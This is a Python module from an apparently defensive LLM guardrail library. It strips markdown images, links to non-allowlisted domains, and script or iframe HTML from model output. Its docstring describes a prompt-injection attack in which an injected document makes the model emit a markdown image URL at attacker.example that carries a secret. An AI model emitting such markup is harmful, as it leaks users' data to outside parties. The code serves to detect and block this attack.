"""Output handling (OWASP LLM05): neutralize model output that would act on the client.

The classic zero-click exfiltration: an injected document makes the model emit
  ![x](https://attacker.example/log?d=<secret>)
and the chat UI fetches it, leaking data in the URL. We strip images and links to
non-allowlisted domains, and drop raw HTML/script.
"""

from __future__ import annotations

import re
from urllib.parse import urlparse

from promptwall.types import Action, Finding, Verdict

MD_IMAGE = re.compile(r"!\[([^\]]*)\]\(\s*(<?)([^)\s>]+)(>?)[^)]*\)")
MD_LINK = re.compile(r"(?<!!)\[([^\]]*)\]\(\s*(<?)([^)\s>]+)(>?)[^)]*\)")
HTML_TAG = re.compile(r"<\s*(script|iframe|img|object|embed|svg|style|link|meta)\b[^>]*>(?:.*?<\s*/\s*\1\s*>)?", re.I | re.S)


def _allowed(url: str, domains: list[str]) -> bool:
    host = (urlparse(url).hostname or "").lower()
    if not host:
        return True  # relative link: same origin
    return any(host == d or host.endswith("." + d) for d in domains)


def check(text: str, allowed_domains: list[str]) -> Verdict:
    findings: list[Finding] = []

    def img(m):
        if _allowed(m.group(3), allowed_domains):
            return m.group(0)
        findings.append(Finding("output", "exfil:markdown_image", f"image to {urlparse(m.group(3)).hostname}"))
        return f"[image removed: {m.group(1) or 'untrusted source'}]"

    def link(m):
        if _allowed(m.group(3), allowed_domains):
            return m.group(0)
        findings.append(Finding("output", "exfil:link", f"link to {urlparse(m.group(3)).hostname}"))
        return f"{m.group(1)} [link removed]"

    def tag(m):
        findings.append(Finding("output", "unsafe_html", f"<{m.group(1).lower()}> removed"))
        return ""

    out = MD_IMAGE.sub(img, text or "")
    out = MD_LINK.sub(link, out)
    out = HTML_TAG.sub(tag, out)
    if not findings:
        return Verdict()
    return Verdict(Action.REDACT, findings, out)
